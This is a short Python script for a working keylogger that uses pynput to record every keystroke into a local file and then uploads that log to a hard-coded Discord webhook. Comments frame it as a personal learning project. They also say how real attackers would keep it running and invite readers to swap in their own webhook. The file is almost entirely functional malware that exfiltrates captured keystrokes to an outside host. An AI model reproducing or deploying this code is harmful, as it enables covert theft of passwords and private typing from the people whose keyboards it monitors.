from pynput import keyboard
 # importing pynput which will allow us to monitor key 
import requests


# creating the parameter function that must be placed into the keyboard listener to print out the keys
def keyPressed(key):
    print(str(key))
    with open("log.txt", "a", encoding="utf-8") as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error")

    if key == keyboard.Key.esc: # we will use escape to stop the keylogger
        # real threat actors may perfer to run the program and update its output to a server they have access to instead of stopping it.
        send_file_to_discord("log.txt")
        return False
    


#creating the function to send the keylogs to my discord server. Putting the hard link is not best practice and should be hidden    
def send_file_to_discord(doc): # however I will not worry about hiding the link because this script won't be used in a real scenario
    discord = "https://discord.com/api/webhooks/1337178495096459426/84dAVFAb_VzFEEVT4ciWkagS3v5JVqGr34EOpiWOkzmSIZ2erxQ33yV7nMxVYLCELn9o" #change this with your own if you want to use
    try:
        with open(doc, "rb") as file:
#to send files to discord we must put it in a dict
            files = {"file": file}
            data = {"content": " Keylog File Uploaded"} # this is the message that will displayed in discord
            response = requests.post(discord, data=data, files=files)
            if response.status_code == 200: 
                print(" File sent successfully")
            else:
                print(f"Failed to send file. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending file: {e}")
    



  # our main function
if __name__ == "__main__":
    listener = keyboard.Listener(on_press= keyPressed) # function parameter used.
    listener.start()
    listener.join()
